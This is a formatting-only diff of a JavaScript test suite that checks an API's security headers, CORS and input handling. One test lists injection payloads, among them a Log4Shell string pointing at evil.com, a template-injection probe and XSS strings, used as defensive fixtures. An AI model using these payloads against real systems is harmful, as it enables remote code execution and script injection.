@@ -33,12 +33,12 @@ describe('Security Headers', () => {
   it('should set Content-Security-Policy header', async () => {
     const res = await app.request('/health');
     const csp = res.headers.get('Content-Security-Policy');
-    
+
     expect(csp).toBeTruthy();
     expect(csp).toContain("default-src 'self'");
     expect(csp).toContain("script-src 'self' 'unsafe-inline'");
     expect(csp).toContain("style-src 'self' 'unsafe-inline'");
-    expect(csp).toContain("font-src https://fonts.gstatic.com");
+    expect(csp).toContain('font-src https://fonts.gstatic.com');
     expect(csp).toContain("img-src 'self' data: https:");
     expect(csp).toContain("connect-src 'self' https://hummbl-api.hummbl.workers.dev");
     expect(csp).toContain("frame-ancestors 'none'");
@@ -46,12 +46,7 @@ describe('Security Headers', () => {
   });
 
   it('should set security headers on all endpoints', async () => {
-    const endpoints = [
-      '/health',
-      '/v1/models',
-      '/v1/models/P1',
-      '/v1/transformations'
-    ];
+    const endpoints = ['/health', '/v1/models', '/v1/models/P1', '/v1/transformations'];
 
     for (const endpoint of endpoints) {
       const res = await app.request(endpoint);
@@ -67,7 +62,7 @@ describe('Security Headers', () => {
     const res = await app.request('/v1/recommend', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ problem: 'test problem' })
+      body: JSON.stringify({ problem: 'test problem' }),
     });
 
     expect(res.headers.get('X-Content-Type-Options')).toBe('nosniff');
@@ -90,34 +85,29 @@ describe('CORS Configuration', () => {
 
   it('should handle OPTIONS requests', async () => {
     const res = await app.request('/health', {
-      method: 'OPTIONS'
+      method: 'OPTIONS',
     });
-    
+
     // OPTIONS requests should be handled by CORS middleware
     // Hono returns 204 for OPTIONS requests
     expect([200, 204]).toContain(res.status);
   });
 
   it('should allow requests from any origin', async () => {
-    const origins = [
-      'https://example.com',
-      'https://hummbl.io',
-      'http://localhost:3000',
-      'null'
-    ];
+    const origins = ['https://example.com', 'https://hummbl.io', 'http://localhost:3000', 'null'];
 
     for (const origin of origins) {
       const res = await app.request('/health', {
-        headers: { Origin: origin }
+        headers: { Origin: origin },
       });
-      
+
       expect(res.headers.get('Access-Control-Allow-Origin')).toBe('*');
     }
   });
 
   it('should allow different HTTP methods', async () => {
     const methods = ['GET', 'POST', 'PUT', 'DELETE'];
-    
+
     for (const method of methods) {
       const res = await app.request('/health', { method });
       // Should not block requests due to CORS
@@ -129,10 +119,10 @@ describe('CORS Configuration', () => {
     const res = await app.request('/health', {
       headers: {
         'X-Custom-Header': 'test-value',
-        'Authorization': 'Bearer token'
-      }
+        Authorization: 'Bearer token',
+      },
     });
-    
+
     // Should not block requests with custom headers
     expect(res.status).toBe(200);
   });
@@ -145,13 +135,13 @@ describe('Input Validation Security', () => {
 
   it('should handle large payloads safely', async () => {
     const largePayload = 'x'.repeat(10000);
-    
+
     const res = await app.request('/v1/recommend', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ problem: largePayload })
+      body: JSON.stringify({ problem: largePayload }),
     });
-    
+
     // Should handle large payloads without crashing
     expect(res.status).toBeLessThan(500);
   });
@@ -164,16 +154,16 @@ describe('Input Validation Security', () => {
       '{"problem": undefined}',
       'null',
       '',
-      '{"problem": {"nested": "object"}}'
+      '{"problem": {"nested": "object"}}',
     ];
 
     for (const body of malformedBodies) {
       const res = await app.request('/v1/recommend', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body
+        body,
       });
-      
+
       // Should handle malformed JSON gracefully
       expect(res.status).toBeLessThan(500);
     }
@@ -187,19 +177,19 @@ describe('Input Validation Security', () => {
       '{{7*7}}',
       '${jndi:ldap://evil.com/a}',
       'javascript:alert(1)',
-      '<img src=x onerror=alert(1)>'
+      '<img src=x onerror=alert(1)>',
     ];
 
     for (const input of specialInputs) {
       const res = await app.request('/v1/recommend', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ problem: input })
+        body: JSON.stringify({ problem: input }),
       });
-      
+
       // Should handle special characters without script execution
       expect(res.status).toBeLessThan(500);
-      
+
       if (res.status === 200) {
         const data = await res.json();
         // Response should not contain unescaped special characters
@@ -216,16 +206,16 @@ describe('Input Validation Security', () => {
       'עברית',
       '🔥🔥🔥 Fire emojis',
       '\u0000 Null byte',
-      '\uFEFF Byte order mark'
+      '\uFEFF Byte order mark',
     ];
 
     for (const input of unicodeInputs) {
       const res = await app.request('/v1/recommend', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json; charset=utf-8' },
-        body: JSON.stringify({ problem: input })
+        body: JSON.stringify({ problem: input }),
       });
-      
+
       // Should handle Unicode without crashing
       expect(res.status).toBeLessThan(500);
     }
